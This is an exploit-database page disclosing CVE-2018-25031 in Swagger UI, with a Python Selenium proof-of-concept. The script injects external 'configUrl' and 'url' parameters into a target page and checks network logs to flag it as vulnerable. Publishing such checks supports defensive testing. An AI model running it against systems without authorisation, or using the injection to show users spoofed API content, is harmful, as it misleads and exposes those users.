---
title: Swagger UI 4.1.3 Critical Information Misrepresentation
url: https://cxsecurity.com/issue/WLB-2023040068
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:32.124385
---

# Swagger UI 4.1.3 Critical Information Misrepresentation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Swagger UI 4.1.3 Critical Information Misrepresentation** **2023.04.21**  Credit:  **[Rafael Cintra Lopes](https://cxsecurity.com/author/Rafael%2BCintra%2BLopes/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2018-25031](https://cxsecurity.com/cveshow/CVE-2018-25031/ "Click to see CVE-2018-25031")**  CWE: **N/A** | |

# Exploit Title: Swagger UI 4.1.3 - User Interface (UI) Misrepresentation of Critical Information
# Date: 14 April, 2023
# Exploit Author: Rafael Cintra Lopes
# Vendor Homepage: https://swagger.io/
# Version: < 4.1.3
# CVE: CVE-2018-25031
# Site: https://rafaelcintralopes.com.br/
# Usage: python swagger-exploit.py https://[swagger-page].com
from selenium import webdriver
from selenium.webdriver.common.desired\_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.service import Service
import time
import json
import sys
if \_\_name\_\_ == "\_\_main\_\_":
target = sys.argv[1]
desired\_capabilities = DesiredCapabilities.CHROME
desired\_capabilities["goog:loggingPrefs"] = {"performance": "ALL"}
options = webdriver.ChromeOptions()
options.add\_argument("--headless")
options.add\_argument("--ignore-certificate-errors")
options.add\_argument("--log-level=3")
options.add\_experimental\_option("excludeSwitches", ["enable-logging"])
# Browser webdriver path
drive\_service = Service("C:/chromedriver.exe")
driver = webdriver.Chrome(service=drive\_service,
options=options,
desired\_capabilities=desired\_capabilities)
driver.get(target+"?configUrl=https://petstore.swagger.io/v2/hacked1.json")
time.sleep(10)
driver.get(target+"?url=https://petstore.swagger.io/v2/hacked2.json")
time.sleep(10)
logs = driver.get\_log("performance")
with open("log\_file.json", "w", encoding="utf-8") as f:
f.write("[")
for log in logs:
log\_file = json.loads(log["message"])["message"]
if("Network.response" in log\_file["method"]
or "Network.request" in log\_file["method"]
or "Network.webSocket" in log\_file["method"]):
f.write(json.dumps(log\_file)+",")
f.write("{}]")
driver.quit()
json\_file\_path = "log\_file.json"
with open(json\_file\_path, "r", encoding="utf-8") as f:
logs = json.loads(f.read())
for log in logs:
try:
url = log["params"]["request"]["url"]
if(url == "https://petstore.swagger.io/v2/hacked1.json"):
print("[Possibly Vulnerable] " + target + "?configUrl=https://petstore.swagger.io/v2/swagger.json")
if(url == "https://petstore.swagger.io/v2/hacked2.json"):
print("[Possibly Vulnerable] " + target + "?url=https://petstore.swagger.io/v2/swagger.json")
except Exception as e:
pass

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040068)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top